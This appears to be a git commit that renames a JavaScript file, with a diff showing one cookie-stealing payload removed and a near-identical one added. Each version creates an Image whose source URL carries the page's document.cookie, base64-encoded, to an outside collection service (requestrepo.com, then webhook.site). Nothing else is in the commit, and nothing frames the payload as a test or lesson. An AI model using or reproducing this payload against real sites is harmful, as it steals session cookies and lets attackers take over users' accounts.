e9e3f64f9f72650edadf4bb2d1f51ae5674622f3
Mark Fijneman <48481393+markfijneman@users.noreply.github.com>
2024-07-25 18:20:32 +0200

    Update and rename script2.js to script3.js

--- script2.js
+++
@@ -1,2 +0,0 @@
-img = new Image();
-img.src = 'http://36ufeuq0.requestrepo.com/' + btoa(document.cookie);
---
+++ script3.js
@@ -0,0 +1,1 @@
+x = new Image(); x.src = 'https://webhook.site/a8857f94-9df6-4b5e-be0e-111a4364a5b6?data='+btoa(document.cookie);
